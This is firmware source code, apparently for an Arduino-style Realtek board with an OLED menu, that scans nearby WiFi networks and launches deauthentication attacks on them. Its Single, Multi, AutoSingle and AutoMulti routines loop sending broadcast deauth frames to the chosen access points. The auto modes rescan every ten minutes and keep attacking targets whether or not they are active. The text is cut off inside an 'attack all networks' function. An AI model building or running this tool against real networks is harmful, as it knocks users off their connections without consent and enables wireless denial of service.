// by Ghost

// Wifi
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// Misc
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>
#include <map>
#ifndef RTW_SECURITY_WPA_WPA2_MIXED
#define RTW_SECURITY_WPA_WPA2_MIXED 6
#endif

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <U8g2_for_Adafruit_GFX.h>
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pins
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13
#define BTN_BACK PB2

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
  int security_type;
} WiFiScanResult;

// Credentials for you Wifi network
char *ssid = "";
char *pass = "";
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> SelectedVector;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;
struct VendorInfo {
    String name;
    String mac_prefix;
};
unsigned long SCROLL_DELAY = 300; // 滚动延迟时间
int scrollPosition = 0;
unsigned long lastScrollTime = 0;
int attackstate = 0;
int menustate = 0;
int deauthstate = 0; 
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;
int num = 0; // 添加全局变量声明
// Structure to store target information
struct TargetInfo {
    uint8_t bssid[6];
    int channel;
    bool active;
};

std::vector<TargetInfo> smartTargets;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 600000; // 10分钟 in milliseconds

// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_off_text_bits[] = { 0x67, 0x70, 0x94, 0x40, 0x96, 0x60, 0x94, 0x40, 0x64, 0x40 };
static const unsigned char PROGMEM image_network_not_connected_bits[] = { 0x82, 0x0e, 0x44, 0x0a, 0x28, 0x0a, 0x10, 0x0a, 0x28, 0xea, 0x44, 0xaa, 0x82, 0xaa, 0x00, 0xaa, 0x0e, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0xea, 0xaa, 0xaa, 0xaa, 0xee, 0xee, 0x00, 0x00 };
static const unsigned char PROGMEM image_cross_contour_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x51, 0x40, 0x8a, 0x20, 0x44, 0x40, 0x20, 0x80, 0x11, 0x00, 0x20, 0x80, 0x44, 0x40, 0x8a, 0x20, 0x51, 0x40, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    result.security_type = record->security;  // 添加这行记录加密类型
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
void selectedmenu(String text) {
  // 使用u8g2显示中文高亮文本
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
  display.fillRect(0, display.getCursorY()-1, display.width() - 30, 12, SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(display.getCursorX(), display.getCursorY()+8);
  u8g2_for_adafruit_gfx.print(text);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  SelectedVector.clear(); // 清空选中的WiFi列表
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

bool contains(std::vector<int>& vec,int value){
  for (int v : vec){
    if(v==value){
      return true;
    }
  }
  return false;
}


void addValue(std::vector<int>& vec,int value){
  if(!contains(vec, value)){
    vec.push_back(value);
  } else{
    Serial.print(value);
    Serial.println("Exits");
    for (auto IT = vec.begin(); IT != vec.end();){
      if(*IT == value){
        IT=vec.erase(IT);
      }
      else{
        ++IT;
      }
    }
    Serial.println("De-selected");
  }
}
//uint8_t becaon_bssid[6];
void toggleSelection(int index) {
  bool found = false;
  int foundIndex = -1;
  
  // 查找是否已经选中
  for(size_t i = 0; i < SelectedVector.size(); i++) {
    if(SelectedVector[i] == index) {
      found = true;
      foundIndex = i;
      break;
    }
  }
  
  // 切换选中状态
  if(found) {
    // 删除选中项
    SelectedVector.erase(SelectedVector.begin() + foundIndex);
  } else {
    // 添加新选中项
    SelectedVector.push_back(index);
  }
}

// 检测字符串是否包含中文字符
bool containsChinese(String str) {
  for (int i = 0; i < str.length(); i++) {
    if ((unsigned char)str[i] > 0x7F) {
      return true;
    }
  }
  return false;
}

void showWiFiDetails(const WiFiScanResult& wifi) {
    bool exitDetails = false;
    int scrollPosition = 0;
    unsigned long lastScrollTime = 0;
    const unsigned long SCROLL_DELAY = 300;
    int detailsScroll = 0;  // 初始化为0，不直接定位到返回按钮
    const int LINE_HEIGHT = 12; // 增加行高，避免文字重叠
    
    while (!exitDetails) {
        unsigned long currentTime = millis();
        
        if (digitalRead(BTN_BACK) == LOW) {
            delay(200);
            exitDetails = true;
            continue;
        }
        
        if (digitalRead(BTN_UP) == LOW) {
            delay(200);
            if (detailsScroll > 0) detailsScroll--;
            scrollPosition = 0; // 重置滚动位置
        }
        
        if (digitalRead(BTN_DOWN) == LOW) {
            delay(200);
            if (detailsScroll < 1) detailsScroll++; // 最多滚动1次，因为总共5行，一屏显示4行
            scrollPosition = 0; // 重置滚动位置
        }

        if (digitalRead(BTN_OK) == LOW) {
            delay(200);
            if (detailsScroll == 1) {
                exitDetails = true;
                continue;
            }
        }

        display.clearDisplay();
        display.setTextSize(1);
        
        struct DetailLine {
            String label;
            String value;
            bool isChinese;
        };
        
        DetailLine details[] = {
            {"SSID:", wifi.ssid.length() > 0 ? wifi.ssid : "<隐藏>", containsChinese(wifi.ssid)},
            {"信号:", String(wifi.rssi) + " dBm", true}, 
            {"信道:", String(wifi.channel) + (wifi.channel >= 36 ? " (5G)" : " (2.4G)"), true},
            {"MAC:", wifi.bssid_str, false},
            {"< 返回 >", "", true}
        };

        // 显示详细信息
        for (int i = 0; i < 4 && (i + detailsScroll) < 5; i++) {
            int currentLine = i + detailsScroll;
            int yPos = 5 + (i * LINE_HEIGHT); // 使用更大的行高
            
            if (currentLine == 4) { // 返回选项
                if (detailsScroll == 1) {
                    display.fillRect(0, yPos-1, display.width(), LINE_HEIGHT, WHITE);
                    u8g2_for_adafruit_gfx.setFontMode(1);
                    u8g2_for_adafruit_gfx.setForegroundColor(BLACK);
                    u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                    u8g2_for_adafruit_gfx.print("< 返回 >");
                    u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                } else {
                    u8g2_for_adafruit_gfx.setFontMode(1);
                    u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                    u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                    u8g2_for_adafruit_gfx.print("< 返回 >");
                }
                continue;
            }

            // 显示标签和值
            if (details[currentLine].isChinese) {
                u8g2_for_adafruit_gfx.setFontMode(1);
                u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                u8g2_for_adafruit_gfx.print(details[currentLine].label);
                
                // 统一从冒号后开始显示值，增加间距
                const int VALUE_X = 40; // 减小间距，避免重叠
                
                // 处理值的滚动显示
                String value = details[currentLine].value;
                bool needScroll = false;
                
                // 判断是否需要滚动
                if (containsChinese(value) && value.length() > 15) { // 中文字符串超过15个字符需要滚动
                    needScroll = true;
                } else if (!containsChinese(value) && value.length() > 20) { // 英文字符串超过20个字符需要滚动
                    needScroll = true;
                }
                
                if (needScroll) {
                    // 更新滚动位置
                    if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                        scrollPosition++;
                        if (scrollPosition >= value.length()) {
                            scrollPosition = 0;
                        }
                        lastScrollTime = currentTime;
                    }
                    
                    // 创建滚动文本
                    String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                    value = scrolledText.substring(0, containsChinese(value) ? 15 : 20);
                }
                
                u8g2_for_adafruit_gfx.setCursor(VALUE_X, yPos+8);
                u8g2_for_adafruit_gfx.print(value);
            } else {
                // 非中文标签
                u8g2_for_adafruit_gfx.setFontMode(1);
                u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                u8g2_for_adafruit_gfx.print(details[currentLine].label);
                
                // 统一从冒号后开始显示值
                const int VALUE_X = 26;
                if (details[currentLine].value.length() > 0) {
                    String value = details[currentLine].value;
                    bool needScroll = false;
                    
                    // MAC地址可能很长，判断是否需要滚动
                    if (value.length() > 20) {
                        needScroll = true;
                    }
                    
                    if (needScroll) {
                        // 更新滚动位置
                        if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                            scrollPosition++;
                            if (scrollPosition >= value.length()) {
                                scrollPosition = 0;
                            }
                            lastScrollTime = currentTime;
                        }
                        
                        // 创建滚动文本
                        String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                        value = scrolledText.substring(0, 20);
                    }
                    
                    if (containsChinese(value)) {
                        u8g2_for_adafruit_gfx.setCursor(VALUE_X, yPos+8);
                        u8g2_for_adafruit_gfx.print(value);
                    } else {
                        display.setCursor(VALUE_X, yPos);
                        display.print(value);
                    }
                }
            }
        }
        
        // 显示滚动指示器
        if (detailsScroll > 0) {
            display.fillTriangle(120, 12, 123, 9, 126, 12, WHITE);
        }
        if (detailsScroll < 1) { // 修改为1
            display.fillTriangle(120, 60, 123, 63, 126, 60, WHITE);
        }
        
        display.display();
        delay(10);
    }
}
void drawssid() {
  const int MAX_DISPLAY_ITEMS = 6;
  const int ITEM_HEIGHT = 10;
  const int Y_OFFSET = 2; // 添加Y轴偏移量
  int startIndex = 0;
  scrollindex = 0;
  bool allSelected = false;
  
  unsigned long pressStartTime = 0;
  bool isLongPress = false;
  const unsigned long LONG_PRESS_DURATION = 1000;
  
  unsigned long lastScrollTime = 0;
  const unsigned long SCROLL_DELAY = 300;
  int scrollPosition = 0;
  String currentScrollText = "";
  
  while(true) {
    unsigned long currentTime = millis();
    
    if(digitalRead(BTN_BACK)==LOW) break;
    
    if(digitalRead(BTN_OK) == LOW) {
      delay(400);
      if(scrollindex == 0) {
        break;
      } else if(scrollindex == 1) {
        if (!allSelected) {
          SelectedVector.clear();
          for (size_t i = 0; i < scan_results.size(); i++) {
            SelectedVector.push_back(i);
          }
          allSelected = true;
        } else {
          SelectedVector.clear();
          allSelected = false;
        }
      } else {
        toggleSelection(scrollindex - 2);
      }
      unsigned long pressStartTime = millis();
      while (digitalRead(BTN_OK) == LOW) {
        if (millis() - pressStartTime >= 800) {
          if (scrollindex >= 2) {
            showWiFiDetails(scan_results[scrollindex - 2]);
          }
          while (digitalRead(BTN_OK) == LOW) delay(10);
          break;
        }
      }
    }
    
    if(digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      scrollPosition = 0;
      if(scrollindex < scan_results.size() + 1) {
        scrollindex++;
        if(scrollindex - startIndex >= MAX_DISPLAY_ITEMS) {
          startIndex++;
        }
      }
    }
    
    if(digitalRead(BTN_UP) == LOW) {
      delay(200);
      scrollPosition = 0;
      if(scrollindex > 0) {
        scrollindex--;
        if(scrollindex < startIndex && startIndex > 0) {
          startIndex--;
        }
      }
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    for(int i = 0; i < MAX_DISPLAY_ITEMS && i <= scan_results.size() + 1; i++) {
      int displayIndex = startIndex + i;
      if(displayIndex > scan_results.size() + 1) break;
      
      bool isHighlighted = (displayIndex == scrollindex);
      
      // 处理返回选项
      if(displayIndex == 0) {
        int yPos = i * ITEM_HEIGHT + Y_OFFSET;
        if(isHighlighted) {
          display.fillRect(0, yPos-1, display.width() - 30, ITEM_HEIGHT - 0.5, SSD1306_WHITE);
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
          u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
          u8g2_for_adafruit_gfx.print("< 返回 >");
        } else {
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
          u8g2_for_adafruit_gfx.print("< 返回 >");
        }
        continue;
      }
      
      // 处理全选/取消全选选项
      if(displayIndex == 1) {
        int yPos = i * ITEM_HEIGHT + Y_OFFSET;
        if(isHighlighted) {
          display.fillRect(0, yPos-1, display.width() - 30, ITEM_HEIGHT - 0.5, SSD1306_WHITE);
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
          u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
          u8g2_for_adafruit_gfx.print(allSelected ? "< 取消全选 >" : "< 全选 >");
        } else {
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
          u8g2_for_adafruit_gfx.print(allSelected ? "< 取消全选 >" : "< 全选 >");
        }
        continue;
      }
      
      // 处理WiFi条目
      int wifiIndex = displayIndex - 2;
      String ssid = scan_results[wifiIndex].ssid;
      
      if(ssid.length() == 0) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
          scan_results[wifiIndex].bssid[0],
          scan_results[wifiIndex].bssid[1],
          scan_results[wifiIndex].bssid[2],
          scan_results[wifiIndex].bssid[3],
          scan_results[wifiIndex].bssid[4],
          scan_results[wifiIndex].bssid[5]);
        ssid = String(mac);
      }

      // 处理滚动显示 - 修改滚动逻辑
      bool needScroll = false;
      if(isHighlighted) {
        if(containsChinese(ssid) && ssid.length() > 26) { // 中文>26后滚动
          needScroll = true;
        } else if(!containsChinese(ssid) && ssid.length() > 18) { // 英文>18后滚动
          needScroll = true;
        }
        
        if(needScroll) {
          if(currentTime - lastScrollTime >= SCROLL_DELAY) {
            scrollPosition++;
            if(scrollPosition >= ssid.length()) {
              scrollPosition = 0;
            }
            lastScrollTime = currentTime;
          }
          String scrolledText = ssid.substring(scrollPosition) + " " + ssid.substring(0, scrollPosition);
          ssid = scrolledText.substring(0, containsChinese(ssid) ? 26 : 18);
        }
      }                                                            
      
      // 处理文本显示
      if(containsChinese(ssid)) {
        if(isHighlighted) { 
          display.fillRect(0, i * ITEM_HEIGHT - 0.5 + Y_OFFSET, display.width() - 30, ITEM_HEIGHT - 0.5, SSD1306_WHITE);
        }
        
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(isHighlighted ? SSD1306_BLACK : SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(0, i * ITEM_HEIGHT + 8 + Y_OFFSET); // 添加Y轴偏移
        
        if(ssid.length() > 26) { // 修改为26
          ssid = ssid.substring(0, 26);
        }
        u8g2_for_adafruit_gfx.print(ssid);
      } else {
        display.setCursor(0, i * ITEM_HEIGHT + Y_OFFSET); // 添加Y轴偏移
        if(isHighlighted) {
          display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        } else {
          display.setTextColor(SSD1306_WHITE);
        }
        
        if(ssid.length() > 18) {
          ssid = ssid.substring(0, 18);
        }
        display.print(ssid);
      }
      
      // 显示信道类型和选中状态
      display.setTextColor(SSD1306_WHITE);
      if(isHighlighted) {
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
      }
      
      display.setCursor(110, i * ITEM_HEIGHT + Y_OFFSET); // 添加Y轴偏移
      display.print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
      
      display.setCursor(123, i * ITEM_HEIGHT + Y_OFFSET); // 添加Y轴偏移
      bool isSelected = false;
      for(int selectedIdx : SelectedVector) {
        if(selectedIdx == wifiIndex) {
          isSelected = true;
          break;
        }
      }
      display.print(isSelected ? "*" : " ");
      
      display.setTextColor(SSD1306_WHITE);
    }
    
    display.display();
  }
}
void drawscan() {
  while (true) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("扫描中...(3~5秒)");
    
    display.display();
    if (scanNetworks() != 0) {
      while (true) delay(1000);
    }
    Serial.print("Done");
    display.clearDisplay();
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("完成");
    
    display.display();
    delay(300);
    menustate = 2; // 将菜单状态设置为"Select"
    break;
  }
}
void Single() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("单一攻击中...");
  
  display.display();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  int packetCount = 0;
  
  while (true) {
    if (digitalRead(BTN_OK) == LOW | digitalRead(BTN_BACK)==LOW){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      return;
    }
    
    if (SelectedVector.empty()) {
      memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
      
      deauth_reason = 1;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 4;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 16;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      
      packetCount += 3;
      if (packetCount >= 1000) {
        digitalWrite(LED_G, HIGH);
        delay(50);
        digitalWrite(LED_G, LOW);
        packetCount = 0;
      }
    } else {
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
          memcpy(deauth_bssid, scan_results[selectedIndex].bssid, 6);
          wext_set_channel(WLAN0_NAME, scan_results[selectedIndex].channel);
          
          for (int x = 0; x < perdeauth; x++) {
            deauth_reason = 1;
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            deauth_reason = 4;
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            deauth_reason = 16;
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            
            packetCount += 3; // 修改计数
            if (packetCount >= 1000) {
              digitalWrite(LED_G, HIGH);
              delay(50);
              digitalWrite(LED_G, LOW);
              packetCount = 0;
            }
          }
        }
      }
    }
  }
}

void Multi() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("多重攻击中...");
  
  display.display();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  int packetCount = 0;
  
  while (true) {
    if (digitalRead(BTN_OK) == LOW | digitalRead(BTN_BACK)==LOW){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      return;
    }
    
    if (SelectedVector.empty()) {
      continue;
    }
    
    if (num >= SelectedVector.size()) {
      num = 0;
    }
    
    int targetIndex = SelectedVector[num];
    if (targetIndex >= 0 && targetIndex < scan_results.size()) {
      memcpy(deauth_bssid, scan_results[targetIndex].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[targetIndex].channel);
      
      for (int i = 0; i < 10; i++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
        packetCount++;
        
        if (packetCount >= 10) {
          digitalWrite(LED_G, HIGH);
          delay(50);
          digitalWrite(LED_G, LOW);
          packetCount = 0;
        }
      }
    }
    
    num++;
    delay(50);
  }
}
void updateSmartTargets() {
  // 备份当前的扫描结果
  std::vector<WiFiScanResult> backup_results = scan_results;
  
  // 清空当前扫描结果以准备新的扫描
  scan_results.clear();
  
  // 标记所有目标为非活跃
  for (auto& target : smartTargets) {
    target.active = false;
  }

  // 执行新的扫描
  if (scanNetworks() == 0) {  // 扫描成功
    // 更新目标状态
    for (auto& target : smartTargets) {
      for (const auto& result : scan_results) {
        if (memcmp(target.bssid, result.bssid, 6) == 0) {
          target.active = true;
          target.channel = result.channel;
          break;
        }
      }
    }
  } else {  // 扫描失败
    // 恢复之前的扫描结果
    scan_results = std::move(backup_results);
    Serial.println("Scan failed, restored previous results");
  }
}
void AutoSingle() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("自动单一攻击中...");
  
  display.display();
  
  // LED setup
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  unsigned long prevBlink = 0;
  bool blueState = true;
  const int blinkInterval = 200;
  unsigned long buttonCheckTime = 0;
  const int buttonCheckInterval = 50; // 检查按钮的间隔
  
  // 初始化目标列表
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    lastScanTime = millis();
  }

  while (true) {
    unsigned long currentTime = millis();
    
    // LED闪烁控制
    if (currentTime - prevBlink >= blinkInterval) {
      blueState = !blueState;
      digitalWrite(LED_G, blueState ? HIGH : LOW);
      prevBlink = currentTime;
    }

    // 按钮检查（增加检查间隔以减少CPU负载）
    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        delay(200);
      return;
      }
      buttonCheckTime = currentTime;
    }

    // 定期扫描更新（每10分钟）
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      std::vector<WiFiScanResult> backup = scan_results; // 备份当前结果
      updateSmartTargets();
      if (scan_results.empty()) {
        scan_results = std::move(backup); // 如果扫描失败，恢复备份
      }
      lastScanTime = currentTime;
    }

    int packetCount = 0;

if (smartTargets.empty()) {
  // 如果没有目标，等待一段时间再继续
  delay(100);
  continue;
}
     // 攻击目标
    for (const auto& target : smartTargets) {
  // 不管是否活跃都进行攻击
  memcpy(deauth_bssid, target.bssid, 6);
  wext_set_channel(WLAN0_NAME, target.channel);
  
  for (int i = 0; i < 3; i++) {
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 1);
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 4);
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 16);
            
      packetCount += 3;
      if (packetCount >= 500) {
        digitalWrite(LED_G, HIGH);
        delay(50);
        digitalWrite(LED_G, LOW);
        packetCount = 0;
      }
      
      delay(5);
    }
    
    // 检查按钮状态
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      return;
    }
  }
    delay(10);
  }
}

void AutoMulti() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("自动多重攻击中...");
  
  display.display();
  
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  unsigned long prevBlink = 0;
  bool blueState = true;
  const int blinkInterval = 200;
  unsigned long buttonCheckTime = 0;
  const int buttonCheckInterval = 50;
  static size_t currentTargetIndex = 0;

  // 初始化目标列表
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    lastScanTime = millis();
  }

  while (true) {
    unsigned long currentTime = millis();
    
    // LED闪烁控制
    if (currentTime - prevBlink >= blinkInterval) {
      blueState = !blueState;
      digitalWrite(LED_G, blueState ? HIGH : LOW);
      prevBlink = currentTime;
    }

    // 按钮检查
    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        delay(200);
      return;
      }
      buttonCheckTime = currentTime;
    }

     // 定期扫描更新
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      std::vector<WiFiScanResult> backup = scan_results; // 备份当前结果
      updateSmartTargets();
      if (scan_results.empty()) {
        scan_results = std::move(backup); // 如果扫描失败，恢复备份
      }
      lastScanTime = currentTime;
    }

    int packetCount = 0;

    // 攻击目标
    if (!smartTargets.empty()) {
    // 重置索引
    if (currentTargetIndex >= smartTargets.size()) {
      currentTargetIndex = 0;
    }

    // 不需要检查活跃状态，直接攻击
    const auto& target = smartTargets[currentTargetIndex];
    memcpy(deauth_bssid, target.bssid, 6);
    wext_set_channel(WLAN0_NAME, target.channel);

    for (int i = 0; i < 5; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      packetCount++;
      
      if (packetCount >= 50) {
        digitalWrite(LED_G, HIGH);
        delay(50);
        digitalWrite(LED_G, LOW);
        packetCount = 0;
      }
      
      delay(5);
    }

    currentTargetIndex = (currentTargetIndex + 1) % smartTargets.size();
  }
    
    delay(10);
  }
}
void All() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("全网攻击中...");
  
  display.display();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  unsigned long prevBlink = 0;
  bool greenState = true;
  const int blinkInterval = 500;
  int packetCount = 0;
  
